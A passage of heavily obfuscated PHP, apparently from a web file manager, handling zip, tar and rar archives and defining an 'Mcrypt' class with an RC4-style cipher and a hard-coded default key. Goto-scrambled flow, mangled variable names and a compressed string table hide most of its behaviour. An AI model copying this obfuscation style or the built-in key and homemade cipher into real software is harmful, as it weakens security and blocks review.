array($Fà‡ŸÂÈèà[1031], $Fà‡ŸÂÈèà[1859], $Fà‡ŸÂÈèà[1860], $Fà‡ŸÂÈèà[1861], $Fà‡ŸÂÈèà[1862], $Fà‡ŸÂÈèà[1863], $Fà‡ŸÂÈèà[1864])); goto CÁ∑Çÿ‘´ø; CÁ∑Çÿ‘´ø: $E≠»´ÎÃ∫ô = in_array($bî∂†Õè°Ó, $A˘ë§Í¡Ï¨[$f˘∆Ñ∂…Ïö]); if ($E≠»´ÎÃ∫ô && ($f˘∆Ñ∂…Ïö == $Fà‡ŸÂÈèà[307] || $f˘∆Ñ∂…Ïö == $Fà‡ŸÂÈèà[1857]) && (!function_exists($Fà‡ŸÂÈèà[1865]) || !function_exists($Fà‡ŸÂÈèà[1866]))) { show_tips($Fà‡ŸÂÈèà[1867]); } if ($E≠»´ÎÃ∫ô && $f˘∆Ñ∂…Ïö == $Fà‡ŸÂÈèà[1031] && (!function_exists($Fà‡ŸÂÈèà[1868]) || !strstr(shell_exec($Fà‡ŸÂÈèà[1869]), $Fà‡ŸÂÈèà[1870]))) { show_tips($Fà‡ŸÂÈèà[1871]); } goto aŸﬁáÍí®Ÿ; c≈ÂîÃ∆™¨: } static function listContent($EöüÌﬁŸº±, $bÚ∆ÙùÚÓ’ = true) { $B≥‡ﬁÃ˜¢ë =& $_SERVER[Æ¡î¢≠¯™]; self::init(); $D¢â›ÉõÒ = !empty($GLOBALS[$B≥‡ﬁÃ˜¢ë[1035]]) ? $GLOBALS[$B≥‡ﬁÃ˜¢ë[1035]] : get_path_ext($EöüÌﬁŸº±); $Bß¶›Á®∆Ô = !1; if (self::checkIfType($D¢â›ÉõÒ, $B≥‡ﬁÃ˜¢ë[1857])) { $bçÔ≈Ãœ√¶ = PclTarList($EöüÌﬁŸº±, $D¢â›ÉõÒ); $Bß¶›Á®∆Ô = array(); for ($dÑ∑Ÿ«ÃÑæ = 0; $dÑ∑Ÿ«ÃÑæ < count($bçÔ≈Ãœ√¶); $dÑ∑Ÿ«ÃÑæ++) { $c”æıèé¨ç = $bçÔ≈Ãœ√¶[$dÑ∑Ÿ«ÃÑæ]; if ($c”æıèé¨ç[$B≥‡ﬁÃ˜¢ë[1872]] == $B≥‡ﬁÃ˜¢ë[1873] || $c”æıèé¨ç[$B≥‡ﬁÃ˜¢ë[1872]] == $B≥‡ﬁÃ˜¢ë[1874]) { continue; } if ($bÚ∆ÙùÚÓ’) { $c”æıèé¨ç[$B≥‡ﬁÃ˜¢ë[1875]] = ltrim($c”æıèé¨ç[$B≥‡ﬁÃ˜¢ë[1875]], $B≥‡ﬁÃ˜¢ë[1133]); } if ($c”æıèé¨ç[$B≥‡ﬁÃ˜¢ë[1872]] == $B≥‡ﬁÃ˜¢ë[1876]) { $c”æıèé¨ç[$B≥‡ﬁÃ˜¢ë[86]] = !0; } else { $c”æıèé¨ç[$B≥‡ﬁÃ˜¢ë[86]] = !1; } $c”æıèé¨ç[$B≥‡ﬁÃ˜¢ë[1022]] = $dÑ∑Ÿ«ÃÑæ; $Bß¶›Á®∆Ô[] = $c”æıèé¨ç; } } else { if (self::checkIfType($D¢â›ÉõÒ, $B≥‡ﬁÃ˜¢ë[1031])) { $dâÛ¬„Ô•∆ = kodRarArchive::listContent($EöüÌﬁŸº±); if (!$dâÛ¬„Ô•∆[$B≥‡ﬁÃ˜¢ë[1018]]) { return $dâÛ¬„Ô•∆; } else { $Bß¶›Á®∆Ô = $dâÛ¬„Ô•∆[$B≥‡ﬁÃ˜¢ë[1020]]; } } else { if (kodZipArchive::support($B≥‡ﬁÃ˜¢ë[360])) { $Bß¶›Á®∆Ô = kodZipArchive::listContent($EöüÌﬁŸº±); } else { $A˜ÇÉ¶¥·Ç = new PclZip($EöüÌﬁŸº±); $Bß¶›Á®∆Ô = $A˜ÇÉ¶¥·Ç->listContent(); } } } if ($Bß¶›Á®∆Ô) { $F∂Ωã≠Öâè = unzip_charset_get($Bß¶›Á®∆Ô); $bÚ∆ÙùÚÓ’ = $bÚ∆ÙùÚÓ’ && function_exists($B≥‡ﬁÃ˜¢ë[75]); for ($dÑ∑Ÿ«ÃÑæ = 0; $dÑ∑Ÿ«ÃÑæ < count($Bß¶›Á®∆Ô); $dÑ∑Ÿ«ÃÑæ++) { $Bß¶›Á®∆Ô[$dÑ∑Ÿ«ÃÑæ][$B≥‡ﬁÃ˜¢ë[1875]] = str_replace(array($B≥‡ﬁÃ˜¢ë[1058], $B≥‡ﬁÃ˜¢ë[1877]), $B≥‡ﬁÃ˜¢ë[754], $Bß¶›Á®∆Ô[$dÑ∑Ÿ«ÃÑæ][$B≥‡ﬁÃ˜¢ë[1875]]); if ($bÚ∆ÙùÚÓ’) { $Bß¶›Á®∆Ô[$dÑ∑Ÿ«ÃÑæ][$B≥‡ﬁÃ˜¢ë[1875]] = iconv_to($Bß¶›Á®∆Ô[$dÑ∑Ÿ«ÃÑæ][$B≥‡ﬁÃ˜¢ë[1875]], $F∂Ωã≠Öâè, $B≥‡ﬁÃ˜¢ë[332]); unset($Bß¶›Á®∆Ô[$dÑ∑Ÿ«ÃÑæ][$B≥‡ﬁÃ˜¢ë[1878]]); } } return array($B≥‡ﬁÃ˜¢ë[1018] => !0, $B≥‡ﬁÃ˜¢ë[1020] => $Bß¶›Á®∆Ô); } else { return array($B≥‡ﬁÃ˜¢ë[1018] => !1, $B≥‡ﬁÃ˜¢ë[1020] => $Bß¶›Á®∆Ô); } } static function extract($CÏ„…°’—È, $B≈÷ÖÇø¨Ö, $Aòã¡Öß§≠ = "\x2d\x31", &$f¬ü›Û◊òô = false) { goto D⁄ÿö¢‚ØÕ; D⁄ÿö¢‚ØÕ: $AìææÒæÑÀ =& $_SERVER[Æ¡î¢≠¯™]; self::init(); $cÕÂØúù◊Ê = !empty($GLOBALS[$AìææÒæÑÀ[1035]]) ? $GLOBALS[$AìææÒæÑÀ[1035]] : get_path_ext($CÏ„…°’—È); goto CçÙÓóò˘û; dáé…∏ö˜Ÿ: if (self::checkIfType($cÕÂØúù◊Ê, $AìææÒæÑÀ[1857])) { if ($Aòã¡Öß§≠ != $AìææÒæÑÀ[1017]) { $bëË≠Ú⁄Îæ = unzip_pre_name($bëË≠Ú⁄Îæ); $F˜àâÃ◊‡ç = unzip_pre_name($F˜àâÃ◊‡ç); $AÂŒŒÎÆÊı = PclTarExtractList($CÏ„…°’—È, array($bëË≠Ú⁄Îæ), $B≈÷ÖÇø¨Ö, $F˜àâÃ◊‡ç, $cÕÂØúù◊Ê); } else { $AÂŒŒÎÆÊı = PclTarExtract($CÏ„…°’—È, $B≈÷ÖÇø¨Ö, $AìææÒæÑÀ[66], $cÕÂØúù◊Ê); } return array($AìææÒæÑÀ[1018] => $AÂŒŒÎÆÊı, $AìææÒæÑÀ[1020] => PclErrorString(!0)); } else { if (self::checkIfType($cÕÂØúù◊Ê, $AìææÒæÑÀ[1031])) { return kodRarArchive::extract($CÏ„…°’—È, $B≈÷ÖÇø¨Ö, $cÕÂØúù◊Ê, $f¬ü›Û◊òô); } else { if (kodZipArchive::support($AìææÒæÑÀ[1879])) { return kodZipArchive::extract($CÏ„…°’—È, $B≈÷ÖÇø¨Ö, $f¬ü›Û◊òô); } else { $dóéØ’ëÉª = new PclZip($CÏ„…°’—È); if ($Aòã¡Öß§≠ != $AìææÒæÑÀ[1017]) { $AÂŒŒÎÆÊı = $dóéØ’ëÉª->extract(PCLZIP_OPT_PATH, $B≈÷ÖÇø¨Ö, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $AìææÒæÑÀ[1880], PCLZIP_OPT_BY_NAME, $b€»‹òéßê[$AìææÒæÑÀ[1875]], PCLZIP_OPT_REMOVE_PATH, $F˜àâÃ◊‡ç, PCLZIP_OPT_REPLACE_NEWER); } else { $AÂŒŒÎÆÊı = $dóéØ’ëÉª->extract(PCLZIP_OPT_PATH, $B≈÷ÖÇø¨Ö, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $AìææÒæÑÀ[1880], PCLZIP_OPT_REPLACE_NEWER); } return array($AìææÒæÑÀ[1018] => $AÂŒŒÎÆÊı, $AìææÒæÑÀ[1020] => $dóéØ’ëÉª->errorName(!0)); } } } return array($AìææÒæÑÀ[1018] => !1, $AìææÒæÑÀ[1020] => $AìææÒæÑÀ[1881]); goto cå¬‚Ø–‘∂; CçÙÓóò˘û: $D–çô«÷Ûé = self::listContent($CÏ„…°’—È, !1); if (!$D–çô«÷Ûé[$AìææÒæÑÀ[1018]]) { return $D–çô«÷Ûé; } if ($Aòã¡Öß§≠ != $AìææÒæÑÀ[1017]) { goto dƒÃùº˘é¿; eëß–îæªÒ: if ($GLOBALS[$AìææÒæÑÀ[6]][$AìææÒæÑÀ[1131]] != $AìææÒæÑÀ[332]) { $bëË≠Ú⁄Îæ = unzip_pre_name($f¬ü›Û◊òô); } $F˜àâÃ◊‡ç = get_path_father($f¬ü›Û◊òô); if ($F˜àâÃ◊‡ç == $f¬ü›Û◊òô) { $F˜àâÃ◊‡ç = $AìææÒæÑÀ[33]; } goto eùÏ≥∏º«∑; dƒÃùº˘é¿: $b€»‹òéßê = self::fileIndex($D–çô«÷Ûé[$AìææÒæÑÀ[1020]], $Aòã¡Öß§≠); $f¬ü›Û◊òô = str_replace(array($AìææÒæÑÀ[1058], $AìææÒæÑÀ[1877]), $AìææÒæÑÀ[80], $b€»‹òéßê[$AìææÒæÑÀ[1875]]); $bëË≠Ú⁄Îæ = $f¬ü›Û◊òô; goto eëß–îæªÒ; eùÏ≥∏º«∑: if ($b€»‹òéßê[$AìææÒæÑÀ[86]]) { $bëË≠Ú⁄Îæ = rtrim($bëË≠Ú⁄Îæ, $AìææÒæÑÀ[8]) . $AìææÒæÑÀ[8]; $f¬ü›Û◊òô = array($f¬ü›Û◊òô); } $aùÉ’ˆÏÎÜ = str_replace($AìææÒæÑÀ[105], $AìææÒæÑÀ[8], $bëË≠Ú⁄Îæ); if (substr($aùÉ’ˆÏÎÜ, -1) == $AìææÒæÑÀ[8]) { if (!strstr(trim($aùÉ’ˆÏÎÜ, $AìææÒæÑÀ[8]), $AìææÒæÑÀ[8])) { $B≈÷ÖÇø¨Ö = $B≈÷ÖÇø¨Ö . get_path_this($aùÉ’ˆÏÎÜ) . $AìææÒæÑÀ[8]; } } else { if ($F˜àâÃ◊‡ç == $bëË≠Ú⁄Îæ) { $F˜àâÃ◊‡ç = $AìææÒæÑÀ[33]; } } goto eÁùƒ≥àã≥; eÁùƒ≥àã≥: } goto dáé…∏ö˜Ÿ; cå¬‚Ø–‘∂: } static function fileIndex($dıµÀÙïø˘, $e‰ìË⁄≈ÂÊ, $DéÃ£ñ∫îƒ = false) { goto d„Ûº€Ö∞≠; cßÕÏ´Ç™: $AµÉê‰ÓÆÆ = count($dıµÀÙïø˘); for ($FÊ∂ﬂæãΩœ = 0; $FÊ∂ﬂæãΩœ < $AµÉê‰ÓÆÆ; $FÊ∂ﬂæãΩœ++) { if ($e‰ìË⁄≈ÂÊ == $dıµÀÙïø˘[$FÊ∂ﬂæãΩœ][$b´®‰µ¥ñ®[1022]]) { $céã≠Æÿâ∞ = $dıµÀÙïø˘[$FÊ∂ﬂæãΩœ]; break; } } if (!$céã≠Æÿâ∞) { show_tips($b´®‰µ¥ñ®[1882]); } goto FñÈºÍüÑ±; FñÈºÍüÑ±: $Bπ≠ê÷ƒ“Œ = $céã≠Æÿâ∞; if ($DéÃ£ñ∫îƒ) { $Bπ≠ê÷ƒ“Œ = $céã≠Æÿâ∞[$DéÃ£ñ∫îƒ]; if ($céã≠Æÿâ∞[$b´®‰µ¥ñ®[86]]) { $Bπ≠ê÷ƒ“Œ = rtrim($Bπ≠ê÷ƒ“Œ, $b´®‰µ¥ñ®[8]) . $b´®‰µ¥ñ®[8]; } } return $Bπ≠ê÷ƒ“Œ; goto EπÀ⁄§®äÁ; d„Ûº€Ö∞≠: $b´®‰µ¥ñ® =& $_SERVER[Æ¡î¢≠¯™]; self::init(); if (!is_array($dıµÀÙïø˘)) { return !1; } goto cßÕÏ´Ç™; EπÀ⁄§®äÁ: } static function extractZipFile($fıÚü∏ æ⁄, $c∆î™çú¨ó, $féﬁáÈá€ì = false) { goto bÈÁ≠Ââ´ß; bÈÁ≠Ââ´ß: $c–√ú§Ú•Ô =& $_SERVER[Æ¡î¢≠¯™]; self::init(); $cê«√ÜÇæﬁ = TEMP_FILES . hash_path($fıÚü∏ æ⁄) . $c–√ú§Ú•Ô[8]; goto a·çπ»Üı√; a·çπ»Üı√: mk_dir($cê«√ÜÇæﬁ); $cÑ◊Áóïƒë = $cê«√ÜÇæﬁ . md5($fıÚü∏ æ⁄ . $c∆î™çú¨ó); if ($féﬁáÈá€ì) { $cÑ◊Áóïƒë = $cê«√ÜÇæﬁ . $féﬁáÈá€ì; } goto FÜ©ÌÉ™Øò; FÜ©ÌÉ™Øò: if (file_exists($cÑ◊Áóïƒë)) { return $cÑ◊Áóïƒë; } $bΩ¬È◊ÂñÏ = new PclZip($fıÚü∏ æ⁄); $B´∑‡ìäÙÉ = unzip_filter_ext($cê«√ÜÇæﬁ . get_path_this($c∆î™çú¨ó)); goto eèù±ÆÙòõ; eèù±ÆÙòõ: $DÛ”¢ ü‹Â = get_path_father($c∆î™çú¨ó); if ($DÛ”¢ ü‹Â == $c∆î™çú¨ó) { $DÛ”¢ ü‹Â = $c–√ú§Ú•Ô[33]; } $BàﬁªÍî≈” = $bΩ¬È◊ÂñÏ->extract(PCLZIP_OPT_PATH, $cê«√ÜÇæﬁ, PCLZIP_CB_PRE_FILE_NAME, $c–√ú§Ú•Ô[1880], PCLZIP_OPT_REMOVE_PATH, $DÛ”¢ ü‹Â, PCLZIP_OPT_BY_NAME, $c∆î™çú¨ó); goto D‹ªØÎœ˜ƒ; D‹ªØÎœ˜ƒ: if (!file_exists($B´∑‡ìäÙÉ)) { return !1; } @rename($B´∑‡ìäÙÉ, $cÑ◊Áóïƒë); return $cÑ◊Áóïƒë; goto d…Ÿ™Œ≥¨”; d…Ÿ™Œ≥¨”: } static function filePreview($Aœ∏Öáƒƒö, $B£á◊”ìäà, $c—èπ‚ïøã = false, $Aê£ œ÷˘ä = false) { goto A›¨”Ñ•ûº; AÜ‰ÃœÈ≤Ê: $b ñ≥ÿ®®© = self::extract($Aœ∏Öáƒƒö, $Bë¶êÂó§Ø, $B£á◊”ìäà, $Bîä«àœèÑ); if (is_array($Bîä«àœèÑ)) { show_json($EáÇœ¥ûÉ[1883], !1); } if (file_exists($cÓ™›∆ÜÎ÷)) { IO::fileOut($cÓ™›∆ÜÎ÷, $c—èπ‚ïøã, get_path_this($Bîä«àœèÑ)); return; } goto Fë≈Øáƒ‡É; A›¨”Ñ•ûº: $EáÇœ¥ûÉ =& $_SERVER[Æ¡î¢≠¯™]; self::init(); $Bë¶êÂó§Ø = TEMP_FILES . hash_path($Aœ∏Öáƒƒö) . $EáÇœ¥ûÉ[8]; goto bù∂£ºŸ√ø; F∫ãáå¶∆á: if (!file_exists($cÓ™›∆ÜÎ÷)) { del_dir($Bë¶êÂó§Ø); show_json($EáÇœ¥ûÉ[1885]); } IO::fileOut($cÓ™›∆ÜÎ÷, $c—èπ‚ïøã, $Eñ≤Õ«àê◊); goto dÎ”áûö…; bù∂£ºŸ√ø: mk_dir($Bë¶êÂó§Ø); $cÓ™›∆ÜÎ÷ = $Bë¶êÂó§Ø . md5($Aœ∏Öáƒƒö . $B£á◊”ìäà . $Aê£ œ÷˘ä); $Bîä«àœèÑ = $EáÇœ¥ûÉ[33]; goto AÜ‰ÃœÈ≤Ê; aËÔƒ«√◊õ: if (!$b ñ≥ÿ®®©[$EáÇœ¥ûÉ[1018]]) { show_json($b ñ≥ÿ®®©[$EáÇœ¥ûÉ[1020]], !1); } if (!file_exists($EÚªÕØ«ñß)) { show_json($EáÇœ¥ûÉ[1884], !1); } @rename($EÚªÕØ«ñß, $cÓ™›∆ÜÎ÷); goto F∫ãáå¶∆á; Fë≈Øáƒ‡É: $Bîä«àœèÑ = unzip_pre_name($Bîä«àœèÑ); $Eñ≤Õ«àê◊ = get_path_this($Bîä«àœèÑ); $EÚªÕØ«ñß = unzip_filter_ext($Bë¶êÂó§Ø . $Eñ≤Õ«àê◊); goto aËÔƒ«√◊õ; dÎ”áûö…: } static function create($Cô‘≤œŒÜﬁ, $AïíãÌ¨‘ƒ) { $c≠Í’õÂˆ¨ =& $_SERVER[Æ¡î¢≠¯™]; self::init(); $D»≈©ñ„√é = get_path_ext($Cô‘≤œŒÜﬁ); $F€ÍìÍ Òå = !1; if (self::checkIfType($D»≈©ñ„√é, $c≠Í’õÂˆ¨[307])) { if (kodZipArchive::support($c≠Í’õÂˆ¨[996])) { return kodZipArchive::create($Cô‘≤œŒÜﬁ, $AïíãÌ¨‘ƒ); } $e¥•Í∆û¯∆ = new PclZip($Cô‘≤œŒÜﬁ); foreach ($AïíãÌ¨‘ƒ as $dˆÔ¢≥Ç≤ß => $cÖŒÇÂ˜õÈ) { $cÖŒÇÂ˜õÈ = str_replace($c≠Í’õÂˆ¨[471], $c≠Í’õÂˆ¨[8], $cÖŒÇÂ˜õÈ); $b•˜ÆõëëÑ = Kodio::clear(get_path_father($cÖŒÇÂ˜õÈ)); if ($dˆÔ¢≥Ç≤ß == 0) { $F€ÍìÍ Òå = $e¥•Í∆û¯∆->create($cÖŒÇÂ˜õÈ, PCLZIP_OPT_REMOVE_PATH, $b•˜ÆõëëÑ, PCLZIP_CB_PRE_FILE_NAME, $c≠Í’õÂˆ¨[1886]); continue; } $F€ÍìÍ Òå = $e¥•Í∆û¯∆->add($cÖŒÇÂ˜õÈ, PCLZIP_OPT_REMOVE_PATH, $b•˜ÆõëëÑ, PCLZIP_CB_PRE_FILE_NAME, $c≠Í’õÂˆ¨[1886]); } } else { if (self::checkIfType($D»≈©ñ„√é, $c≠Í’õÂˆ¨[1857])) { foreach ($AïíãÌ¨‘ƒ as $dˆÔ¢≥Ç≤ß => $cÖŒÇÂ˜õÈ) { $cÖŒÇÂ˜õÈ = str_replace($c≠Í’õÂˆ¨[471], $c≠Í’õÂˆ¨[8], $cÖŒÇÂ˜õÈ); $b•˜ÆõëëÑ = Kodio::clear(get_path_father($cÖŒÇÂ˜õÈ)); if ($dˆÔ¢≥Ç≤ß == 0) { $F€ÍìÍ Òå = PclTarCreate($Cô‘≤œŒÜﬁ, array($cÖŒÇÂ˜õÈ), $D»≈©ñ„√é, null, $b•˜ÆõëëÑ); continue; } $F€ÍìÍ Òå = PclTarAddList($Cô‘≤œŒÜﬁ, array($cÖŒÇÂ˜õÈ), $c≠Í’õÂˆ¨[33], $b•˜ÆõëëÑ, $D»≈©ñ„√é); } } } return $F€ÍìÍ Òå; } } class Mcrypt { public static $defaultKey = "\x61\x21\x74\141\x6b\101\x3a\144\154\x6d\143\x6c\x64\x45\x76\54\145"; public static function encode($dÓõôçŸ÷Œ, $a¨—Ô‰ÃÆÂ = '', $fı‰ÖäÙ¬ß = 0, $d¡π≈‘£¶∑ = '') { goto B †äñ≠≈“; c¡⁄⁄¨ı–: $d¯‡ƒø°È• = str_replace(array($a◊êΩ‘ˆÌﬁ[290], $a◊êΩ‘ˆÌﬁ[8], $a◊êΩ‘ˆÌﬁ[895]), array($a◊êΩ‘ˆÌﬁ[416], $a◊êΩ‘ˆÌﬁ[80], $a◊êΩ‘ˆÌﬁ[103]), $d¯‡ƒø°È•); return $d¯‡ƒø°È•; goto c‡ È”›€¢; B≤Ç™«ü˜™: for ($b»Ø≠æ¬µï = 0; $b»Ø≠æ¬µï <= 255; $b»Ø≠æ¬µï++) { $Aôƒ‘å“Éé[$b»Ø≠æ¬µï] = ord($eﬂΩÈ’ ßù[$b»Ø≠æ¬µï % $D¿≈ÏªÇóÜ]); } $A∫ñ›√ÌÖπ = range(0, 255); for ($C◊≠ÜÙπ∞ﬁ = $b»Ø≠æ¬µï = 0; $b»Ø≠æ¬µï < 256; $b»Ø≠æ¬µï++) { $C◊≠ÜÙπ∞ﬁ = ($C◊≠ÜÙπ∞ﬁ + $A∫ñ›√ÌÖπ[$b»Ø≠æ¬µï] + $Aôƒ‘å“Éé[$b»Ø≠æ¬µï]) % 256; $B•‰˘øä¥è = $A∫ñ›√ÌÖπ[$b»Ø≠æ¬µï]; $A∫ñ›√ÌÖπ[$b»Ø≠æ¬µï] = $A∫ñ›√ÌÖπ[$C◊≠ÜÙπ∞ﬁ]; $A∫ñ›√ÌÖπ[$C◊≠ÜÙπ∞ﬁ] = $B•‰˘øä¥è; } goto b“‰ØœÇ—Ë; BÜƒÏòá†ä: $dö∫ª˜»Ê˘ = md5(substr($a¨—Ô‰ÃÆÂ, 0, 16)); $E—èÆí‚Áå = md5(substr($a¨—Ô‰ÃÆÂ, 16, 16)); $d¡π≈‘£¶∑ = $d¡π≈‘£¶∑ ? $d¡π≈‘£¶∑ : md5(microtime()); goto c”àÚ‚ﬁ÷¢; c”àÚ‚ﬁ÷¢: $cªÈ•Ÿà»ø = substr($d¡π≈‘£¶∑, -$b‡•∂’îè¬); $eﬂΩÈ’ ßù = $dö∫ª˜»Ê˘ . md5($dö∫ª˜»Ê˘ . $cªÈ•Ÿà»ø); $D¿≈ÏªÇóÜ = strlen($eﬂΩÈ’ ßù); goto a«ÎÎÇƒ£ê; a«ÎÎÇƒ£ê: $dÓõôçŸ÷Œ = sprintf($a◊êΩ‘ˆÌﬁ[1887], $fı‰ÖäÙ¬ß ? $fı‰ÖäÙ¬ß + time() : 0) . substr(md5($dÓõôçŸ÷Œ . $E—èÆí‚Áå), 0, 16) . $dÓõôçŸ÷Œ; $Bâ™Úƒºï≤ = strlen($dÓõôçŸ÷Œ); $Aôƒ‘å“Éé = array(); goto B≤Ç™«ü˜™; b“‰ØœÇ—Ë: $d¯‡ƒø°È• = $a◊êΩ‘ˆÌﬁ[33]; for ($BÇÆﬂú§•≈ = $C◊≠ÜÙπ∞ﬁ = $b»Ø≠æ¬µï = 0; $b»Ø≠æ¬µï < $Bâ™Úƒºï≤; $b»Ø≠æ¬µï++) { $BÇÆﬂú§•≈ = ($BÇÆﬂú§•≈ + 1) % 256; $C◊≠ÜÙπ∞ﬁ = ($C◊≠ÜÙπ∞ﬁ + $A∫ñ›√ÌÖπ[$BÇÆﬂú§•≈]) % 256; $B•‰˘øä¥è = $A∫ñ›√ÌÖπ[$BÇÆﬂú§•≈]; $A∫ñ›√ÌÖπ[$BÇÆﬂú§•≈] = $A∫ñ›√ÌÖπ[$C◊≠ÜÙπ∞ﬁ]; $A∫ñ›√ÌÖπ[$C◊≠ÜÙπ∞ﬁ] = $B•‰˘øä¥è; $d¯‡ƒø°È• .= chr(ord($dÓõôçŸ÷Œ[$b»Ø≠æ¬µï]) ^ $A∫ñ›√ÌÖπ[($A∫ñ›√ÌÖπ[$BÇÆﬂú§•≈] + $A∫ñ›√ÌÖπ[$C◊≠ÜÙπ∞ﬁ]) % 256]); } $d¯‡ƒø°È• = $cªÈ•Ÿà»ø . str_replace($a◊êΩ‘ˆÌﬁ[895], $a◊êΩ‘ˆÌﬁ[33], base64_encode($d¯‡ƒø°È•)); goto c¡⁄⁄¨ı–; B †äñ≠≈“: $a◊êΩ‘ˆÌﬁ =& $_SERVER[Æ¡î¢≠¯™]; $b‡•∂’îè¬ = 4; $a¨—Ô‰ÃÆÂ = md5($a¨—Ô‰ÃÆÂ ? $a¨—Ô‰ÃÆÂ : self::$defaultKey); goto BÜƒÏòá†ä; c‡ È”›€¢: } public static function decode($BÏ∏üˆÊªœ, $Eıπ∫çÃôÉ = '') { goto F˜Ö∆É∞À–; a∞ÑÆõÎãÛ: $Eıπ∫çÃôÉ = md5($Eıπ∫çÃôÉ ? $Eıπ∫çÃôÉ : self::$defaultKey); $Fúœ’≠ºë® = md5(substr($Eıπ∫çÃôÉ, 0, 16)); $cﬂÜ≥∂ÍØï = md5(substr($Eıπ∫çÃôÉ, 16, 16)); goto EøÑ¬àäíÑ; EøÑ¬àäíÑ: $dµÔä›†ΩÖ = substr($BÏ∏üˆÊªœ, 0, $aﬁãÆ—‹…≈); $e…£å›’íã = $Fúœ’≠ºë® . md5($Fúœ’≠ºë® . $dµÔä›†ΩÖ); $e¬˘«ùˆï = strlen($e…£å›’íã); goto c˘ø™√ ≠Æ; dêØÂ·˜È¬: $D…ƒåèá®£ = $b∏ô¬£ÖÙ∞[33]; for ($eˆ†Ï≈™„ñ = $Fß«ß«‰á© = $a◊ÖñﬂÆÊ⁄ = 0; $a◊ÖñﬂÆÊ⁄ < $BÏ–Üıπíö; $a◊ÖñﬂÆÊ⁄++) { $eˆ†Ï≈™„ñ = ($eˆ†Ï≈™„ñ + 1) % 256; $Fß«ß«‰á© = ($Fß«ß«‰á© + $cÏ‹ø≈Ÿèî[$eˆ†Ï≈™„ñ]) % 256; $CåÙ∞®Œ›∞ = $cÏ‹ø≈Ÿèî[$eˆ†Ï≈™„ñ]; $cÏ‹ø≈Ÿèî[$eˆ†Ï≈™„ñ] = $cÏ‹ø≈Ÿèî[$Fß«ß«‰á©]; $cÏ‹ø≈Ÿèî[$Fß«ß«‰á©] = $CåÙ∞®Œ›∞; $D…ƒåèá®£ .= chr(ord($BÏ∏üˆÊªœ[$a◊ÖñﬂÆÊ⁄]) ^ $cÏ‹ø≈Ÿèî[($cÏ‹ø≈Ÿèî[$eˆ†Ï≈™„ñ] + $cÏ‹ø≈Ÿèî[$Fß«ß«‰á©]) % 256]); } $DÔ‘ÚÃáº‰ = intval(substr($D…ƒåèá®£, 0, 10)); goto Fòçœ¿Íù≈; c˘ø™√ ≠Æ: $BÏ∏üˆÊªœ = base64_decode(substr($BÏ∏üˆÊªœ, $aﬁãÆ—‹…≈)); $BÏ–Üıπíö = strlen($BÏ∏üˆÊªœ); $c˜»≥º†ëÊ = array(); goto A∞≤•Í Ô∞; A∞≤•Í Ô∞: for ($a◊ÖñﬂÆÊ⁄ = 0; $a◊ÖñﬂÆÊ⁄ <= 255; $a◊ÖñﬂÆÊ⁄++) { $c˜»≥º†ëÊ[$a◊ÖñﬂÆÊ⁄] = ord($e…£å›’íã[$a◊ÖñﬂÆÊ⁄ % $e¬˘«ùˆï]); } $cÏ‹ø≈Ÿèî = range(0, 255); for ($Fß«ß«‰á© = $a◊ÖñﬂÆÊ⁄ = 0; $a◊ÖñﬂÆÊ⁄ < 256; $a◊ÖñﬂÆÊ⁄++) { $Fß«ß«‰á© = ($Fß«ß«‰á© + $cÏ‹ø≈Ÿèî[$a◊ÖñﬂÆÊ⁄] + $c˜»≥º†ëÊ[$a◊ÖñﬂÆÊ⁄]) % 256; $CåÙ∞®Œ›∞ = $cÏ‹ø≈Ÿèî[$a◊ÖñﬂÆÊ⁄]; $cÏ‹ø≈Ÿèî[$a◊ÖñﬂÆÊ⁄] = $cÏ‹ø≈Ÿèî[$Fß«ß«‰á©]; $cÏ‹ø≈Ÿèî[$Fß«ß«‰á©] = $CåÙ∞®Œ›∞; } goto dêØÂ·˜È¬; F˜Ö∆É∞À–: $b∏ô¬£ÖÙ∞ =& $_SERVER[Æ¡î¢≠¯™]; $BÏ∏üˆÊªœ = str_replace(array($b∏ô¬£ÖÙ∞[416], $b∏ô¬£ÖÙ∞[80], $b∏ô¬£ÖÙ∞[103]), array($b∏ô¬£ÖÙ∞[290], $b∏ô¬£ÖÙ∞[8], $b∏ô¬£ÖÙ∞[895]), $BÏ∏üˆÊªœ); $aﬁãÆ—‹…≈ = 4; goto a∞ÑÆõÎãÛ; Fòçœ¿Íù≈: if (($DÔ‘ÚÃáº‰ == 0 || $DÔ‘ÚÃáº‰ - time() > 0) && substr($D…ƒåèá®£, 10, 16) == substr(md5(substr($D…ƒåèá®£, 26) . $cﬂÜ≥∂ÍØï), 0, 16)) { return substr($D…ƒåèá®£, 26); } else { return $b∏ô¬£ÖÙ∞[33]; } goto eÕèà·¢éÇ; eÕèà·¢éÇ: } } goto E ˘‹Ìé˘Á; f•Ü°ÆÊ‡: define($_SERVER[Æ¡î¢≠¯™][0], $_SERVER[Æ¡î¢≠¯™][1]); $_SERVER[âñö‚‚Ñ] = explode($_SERVER[Æ¡î¢≠¯™][2], gzinflate(substr($_SERVER[Æ¡î¢≠¯™][3], 10, -8))); function Model($E¨ÿ∫ûê±” = '', $d¢œ„œ»Áª = '', $füπÕ±òπé = '') { goto eõé«ÃÖñ˘; bœ§ÀÖå‡¯: $aæ““ˆäÑç[$bÃ‚øôª∂›] = new ModelBase($E¨ÿ∫ûê±”, $d¢œ„œ»Áª, $füπÕ±òπé); return $aæ““ˆäÑç[$bÃ‚øôª∂›]; goto b…ˆ©Á¶òÈ; eõé«ÃÖñ˘: $d·êÇ†ö£í =& $_SERVER[âñö‚‚Ñ]; static $aæ““ˆäÑç = array(); $bÃ‚øôª∂› = strtolower($d¢œ„œ»Áª . $d·êÇ†ö£í[0] . $E¨ÿ∫ûê±”); goto A¬¥ã∏ø¶¯; A¬¥ã∏ø¶¯: if (isset($aæ““ˆäÑç[$bÃ‚øôª∂›])) { return $aæ““ˆäÑç[$bÃ‚øôª∂›]; } if ($E¨ÿ∫ûê±”) { $E¨ÿ∫ûê±” = strtoupper($E¨ÿ∫ûê±”[0]) . substr($E¨ÿ∫ûê±”, 1); $Fñú«°˜Íõ = $E¨ÿ∫ûê±” . $d·êÇ†ö£í[1]; if (class_exists($Fñú«°˜Íõ)) { $aæ““ˆäÑç[$bÃ‚øôª∂›] = new $Fñú«°˜Íõ(); return $aæ““ˆäÑç[$bÃ‚øôª∂›]; } } if (!$füπÕ±òπé) { $füπÕ±òπé = 